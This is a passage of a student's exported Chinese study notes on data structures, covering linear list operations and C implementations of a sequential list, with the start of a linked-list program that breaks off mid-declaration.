src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155844508.png" alt="image-20230322155844508"></p><p><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20230322155956690.png" alt="image-20230322155956690"></p></li><li><p>缺点</p><ul><li>存储空间分配不灵活</li><li>空间复杂度高</li></ul></li></ol><h3 id="线性表的类型定义"><a href="#线性表的类型定义" class="headerlink" title="线性表的类型定义"></a>线性表的类型定义</h3><ol><li>线性表的操作<ul><li><p>线性表的初始化（<code>IniList</code>）![image-20230322191953037](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191953037.png)</p></li><li><p>线性表的销毁（<code>DestroyList</code>）</p><p>连本身都没有了</p><p>![image-20230322192004208](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192004208.png)</p></li><li><p>线性表的清楚（<code>ClearList</code>）</p><p>还存在，但是是一个空表</p><p>![image-20230322192014702](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192014702.png)</p></li><li><p>判断线性表是否为空（<code>ListEmpty</code>）</p><p>![image-20230322192029109](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192029109.png)</p></li><li><p>求线性表的长度（<code>ListLength</code>）</p><p>![image-20230322192050448](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192050448.png)</p></li><li><p>获取元素(<code>GetElem</code>)</p><p>![image-20230322190529314](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190529314.png)</p></li><li><p>查找元素（<code>LocateElem</code>）</p><p>![image-20230322190615757](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190615757.png)</p></li><li><p>求一个元素的前驱（<code>PrioElem</code>）</p><p>![image-20230322190742641](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190742641.png)</p></li><li><p>获得一个元素的后继（<code>NextElem</code>）</p><p>![image-20230322190833997](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322190833997.png)</p></li><li><p>插入一个元素（<code>ListInsert</code>）</p><p>![image-20230322191334889](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191334889.png)</p></li><li><p>删除一个元素（<code>ListDelete</code>）</p><p>![image-20230322191749620](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191749620.png)</p></li><li><p>遍历线性表（<code>LIstTraverse</code>）</p><p>![image-20230322191844657](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322191844657.png)</p></li></ul></li></ol><h3 id="线性表的存储结构"><a href="#线性表的存储结构" class="headerlink" title="线性表的存储结构"></a>线性表的存储结构</h3><h4 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h4><ol><li><p>定义：把逻辑上相邻的数据元素存储在物理相邻的存储单元</p><p>![image-20230322192505711](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230322192505711.png)</p></li></ol><h3 id="线性表的顺序表示和实现"><a href="#线性表的顺序表示和实现" class="headerlink" title="线性表的顺序表示和实现"></a>线性表的顺序表示和实现</h3><ol><li><p>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">//基本模板</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define  SIZE 100</span><br><span class="hljs-comment">typedef struct&#123;</span><br><span class="hljs-comment">    ElemType elem[SIZE];</span><br><span class="hljs-comment">    int length;</span><br><span class="hljs-comment">&#125;SqList;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">//int 型</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem[SIZE];<br>    <span class="hljs-type">int</span> length;<br>&#125;intList;<br><br><span class="hljs-comment">//int double</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">int</span> intElem;<br>    <span class="hljs-type">double</span> doubleElem;<br>&#125;Polynomial;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Polynomial * PPolynomial;<br>    <span class="hljs-type">int</span> length;<br>&#125;PolynomialList;<br><br><br><span class="hljs-comment">//struct</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span>* name;<br>    <span class="hljs-type">char</span>* author;<br>    <span class="hljs-type">float</span> price;<br>    <span class="hljs-type">int</span> num;<br>&#125;Book;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Book* pBook;<br>    <span class="hljs-type">int</span> length;<br>&#125;BookList;<br><br><br></code></pre></td></tr></table></figure></li></ol><h3 id="类C语言相关操作"><a href="#类C语言相关操作" class="headerlink" title="类C语言相关操作"></a>类C语言相关操作</h3><ol><li><p><code>ElemType</code> 元素</p></li><li><p>C语言动态内存分配</p></li></ol><ul><li><p><code>malloc</code>: 开辟连续的地址空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">intList *pIntList=(intList*) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (intList)*SIZE);<br><span class="hljs-built_in">free</span>(pIntList);<br></code></pre></td></tr></table></figure></li></ul><h3 id="线性表的顺序存储"><a href="#线性表的顺序存储" class="headerlink" title="线性表的顺序存储"></a>线性表的顺序存储</h3><p>![image-20230323091558306](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230323091558306.png)</p><ol><li><p>代码示例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;string.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR -1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE 100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElemType *elem;<br>    <span class="hljs-type">int</span> length;<br>&#125; IntList;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span></span>;<br><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ElemType *e;<br>    IntList *list = (IntList *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(IntList));<br>    <span class="hljs-comment">//初始化</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">initList_Sq</span>(list) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(ERROR);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">clearList</span>(list);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>, <span class="hljs-built_in">isEmpty</span>(list) ? <span class="hljs-string">&quot;true&quot;</span> : <span class="hljs-string">&quot;false&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        list-&gt;elem[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        list-&gt;length++;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, <span class="hljs-built_in">getListLength</span>(list));<br>    <span class="hljs-built_in">getElem</span>(list, <span class="hljs-number">4</span>, e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>, *e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;d&#x27;</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, <span class="hljs-built_in">locateElem</span>(list, <span class="hljs-string">&#x27;D&#x27;</span>));<br>    <span class="hljs-built_in">listInsert</span>(list, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;5&#x27;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, list-&gt;elem[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">5</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">listDelete</span>(list,<span class="hljs-number">26</span>,e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%c\n&quot;</span>,*e);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,list-&gt;elem);<br><br>    <span class="hljs-built_in">destroyList</span>(list);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//删除</span><br><span class="hljs-function">status <span class="hljs-title">listDelete</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &lt; <span class="hljs-number">1</span> || s &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e=list-&gt;elem[s<span class="hljs-number">-1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s - <span class="hljs-number">1</span>; i &lt; list-&gt;length - <span class="hljs-number">1</span>; ++i) &#123;<br>        list-&gt;elem[i] = list-&gt;elem[i + <span class="hljs-number">1</span>];<br>    &#125;<br>    list-&gt;elem[--list-&gt;length] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//插入</span><br><span class="hljs-function">status <span class="hljs-title">listInsert</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> s, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s &gt; SIZE || s &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = list-&gt;length - <span class="hljs-number">1</span>; i &gt;= s - <span class="hljs-number">1</span>; --i) &#123;<br>        list-&gt;elem[i + <span class="hljs-number">1</span>] = list-&gt;elem[i];<br>    &#125;<br>    list-&gt;elem[s - <span class="hljs-number">1</span>] = e;<br>    list-&gt;length++;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//顺序查找空间复杂度为  O(n)</span><br><span class="hljs-function">status <span class="hljs-title">locateElem</span><span class="hljs-params">(IntList *list, ElemType e)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list-&gt;length; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (e == list-&gt;elem[i]) &#123;<br>            <span class="hljs-keyword">return</span> i + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getElem</span><span class="hljs-params">(IntList *list, <span class="hljs-type">int</span> i, ElemType *e)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt; list-&gt;length) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    *e = list-&gt;elem[i - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">getListLength</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!list) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">return</span> list-&gt;length;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">isEmpty</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list-&gt;length == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">clearList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-built_in">memset</span>(list-&gt;elem, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(list-&gt;elem));<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">destroyList</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (list) <span class="hljs-built_in">free</span>(list);<br>    <span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> OK;<br>    <span class="hljs-keyword">return</span> ERROR;<br>&#125;<br><br><span class="hljs-function">status <span class="hljs-title">initList_Sq</span><span class="hljs-params">(IntList *list)</span> </span>&#123;<br>    list-&gt;elem = (ElemType *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(ElemType) * SIZE);<br>    <span class="hljs-keyword">if</span> (!list) <span class="hljs-keyword">return</span> ERROR;<br>    list-&gt;length = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="线性表的链式储存"><a href="#线性表的链式储存" class="headerlink" title="线性表的链式储存"></a>线性表的链式储存</h3><ol><li><p>指针的组成：数据域和指针域（指向下一个）</p></li><li><p>链表的类型</p><ul><li><p>单链表：</p><p>只有一个指针域的链表</p></li><li><p>双链表：</p><p>有两个指针域的链表</p></li><li><p>循环链表：</p><p>首尾相连的链表</p></li></ul></li><li><p>空表的判断：</p><blockquote><p>看一下头指针的是否为NULL,如果为NULL则是空链表</p></blockquote></li><li><p>设置头节点的好处：</p><blockquote><ol><li>便于首元节点的处理</li><li>处理空表和非空表就一样了</li></ol></blockquote><p>![image-20230324170004103](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170004103.png)</p></li><li><p>存取元素的方法叫做顺序存取法</p><p>![image-20230324170213582](C:\Users\12414\OneDrive - cuit.edu.cn\学\笔记\数据结构和算法\数据结构和算法.assets\image-20230324170213582.png)</p><p>顺序表是随机存取 </p></li><li><p>链表的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//链表</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><span class="hljs-comment">//使用node表示节点</span><br><span class="hljs-comment">//使用linkList表示链表的</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">isEmpty</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">clearList</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">listLength</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getElemSub</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">const</span> <span class="hljs-type">char</span> e)</span>;<br><br>status <span class="hljs-title function_">getElemBySub</span><span 